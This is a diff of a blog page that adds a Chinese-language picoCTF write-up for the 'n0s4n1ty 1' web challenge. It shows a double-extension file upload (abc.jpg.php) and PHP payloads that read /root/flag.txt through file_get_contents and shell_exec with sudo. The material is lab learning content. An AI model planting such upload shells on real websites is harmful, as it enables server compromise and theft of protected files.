@@ -59,7 +59,36 @@
                 <div class="row gx-4 gx-lg-5 justify-content-center">
                     <div class="col-md-10 col-lg-8 col-xl-7">
                         <!-- Article 1 Preview -->
-                        <h1 id="reverse">reverse</h1>
+                            <h1 id="web-exploitation">Web Exploitation</h1>
+                            <h2 id="n0s4n1ty-1">n0s4n1ty 1</h2>
+                            <p>嘗試上傳php檔案，並改成包含圖片檔的附檔名</p>
+                            <pre><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+                            <span class="hljs-comment">// 顯示 Hello, World!</span>
+                            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello, World!"</span>;
+                            <span class="hljs-meta">?&gt;</span></span>
+                            </code></pre><p>分別以<code>abc.jpg.php</code>以及<code>abc.php.jpg</code>兩個檔名來測試</p>
+                            <p>拜訪<code>http://standard-pizzas.picoctf.net:53672/uploads/abc.php.jpg</code>
+                            會出現一張照片，可以推測出無法執行該程式碼</p>
+                            <p>拜訪<code>http://standard-pizzas.picoctf.net:53672/uploads/abc.jpg.php</code>
+                            會出現空白頁面，<strong>這個代表網頁可能有在執行abc.jpg.php這個檔案，只是說程式碼有錯誤所以才是空白頁面</strong></p>
+                            <p>因此在php中增加echo確保程式碼能夠被執行</p>
+                            <pre><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+                            <span class="hljs-keyword">echo</span> <span class="hljs-string">"PHP is working! Flag: "</span> . file_get_contents(<span class="hljs-string">'/root/flag.txt'</span>);
+                            <span class="hljs-meta">?&gt;</span></span>
+                            </code></pre><p>出現以下錯誤
+                            <img src="https://hackmd.io/_uploads/S15B8gx2Jx.png" alt="permission deny"></p>
+                            <ul>
+                            <li>推論程式碼可以被執行，只是因為權限問題而無法讀取檔案，不過也確定了檔案結構/var/www/html/uploads/abc.jpg.php </li>
+                            </ul>
+                            <p>看到提示說可以使用shell，所以在程式碼中加入shell</p>
+                            <pre><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+                            <span class="hljs-keyword">echo</span> <span class="hljs-string">"PHP is working!&lt;br&gt;"</span>;
+                            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Flag: "</span> . shell_exec(<span class="hljs-string">'sudo cat /root/flag.txt'</span>);
+                            <span class="hljs-meta">?&gt;</span></span>
+                            </code></pre><p>得到flag啦!</p>
+                            <hr>
+                            
+                            <h1 id="reverse">reverse</h1>
                             <h2 id="event-viewing">Event-Viewing</h2>
                             <p><strong>第一部分</strong></p>
                             <ul>
